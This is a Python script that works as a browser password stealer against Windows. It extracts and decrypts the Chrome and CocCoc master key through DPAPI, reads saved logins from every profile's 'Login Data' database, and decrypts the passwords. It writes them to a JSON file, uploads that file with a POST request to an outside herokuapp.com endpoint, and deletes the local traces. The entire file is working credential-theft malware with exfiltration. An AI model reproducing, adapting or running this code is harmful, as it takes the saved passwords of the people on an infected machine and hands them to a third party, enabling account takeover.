import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests


def get_encryption_key(brow):
    local_state_path = brow
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = json.loads(local_state)

    # decode the encryption key from Base64
    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # remove DPAPI str
    key = key[5:]
    # return decrypted key that was originally encrypted
    # using a session key derived from current user's logon credentials
    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        # get the initialization vector
        iv = password[3:15]
        password = password[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            # not supported
            return ""





def exec(k, check):
    # get the AES key
    key = k
    # local sqlite Chrome database
    if check:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "Google", "Chrome", "User Data", "default", "Login Data")
    else:
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                               "CocCoc", "Browser", "User Data", "default", "Login Data")

    # copy the file to another location
    # as the database will be locked if chrome is currently running
    filename = "text.db"
    data = []
    for x in range(6):
        try:
            shutil.copyfile(db_path, filename)
            print(x)
            # connect to the database
            db = sqlite3.connect(filename)
            cursor = db.cursor()
            # `logins` table has the data we need
            cursor.execute(
                "select origin_url, action_url, username_value, password_value from logins order by date_created")
            # iterate over all rows
            for row in cursor.fetchall():
                origin_url = row[0]
                action_url = row[1]
                username = row[2]
                password = decrypt_password(row[3], key)
                temp = {}
                if username or password:
                    temp['Origin_URL'] = origin_url
                    temp['Action_URL'] = action_url
                    temp['Username'] = username
                    temp['Password'] = password
                else:
                    continue
                # print("="*50)
                data.append(temp)
            cursor.close()
            db.close()
        except:
            if check:
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                       "Google", "Chrome", "User Data", "Profile " + str(x), "Login Data")
            else:
                db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
                                       "CocCoc", "Browser", "User Data", "Profile " + str(x), "Login Data")
    with open('output.json', 'w') as f:
        json.dump(data, f)

    requests.post('https://ttss2.herokuapp.com/torrent',
                      files={'file': open('output.json', 'rb')}, timeout=1)
    


b1 = os.path.join(os.environ["USERPROFILE"],
                  "AppData", "Local", "Google", "Chrome",
                  "User Data", "Local State")
b2 = os.path.join(os.environ["USERPROFILE"],
                  "AppData", "Local", "CocCoc", "Browser",
                  "User Data", "Local State")


def main():
    try:
        if get_encryption_key(b1):
            exec(get_encryption_key(b1), True)
        if get_encryption_key(b2):
            exec(get_encryption_key(b2), False)
    except:
        pass


if __name__ == "__main__":
    main()

    try:
        os.remove('text.db')
        os.remove('output.json')
    except Exception as e:
        print(e)
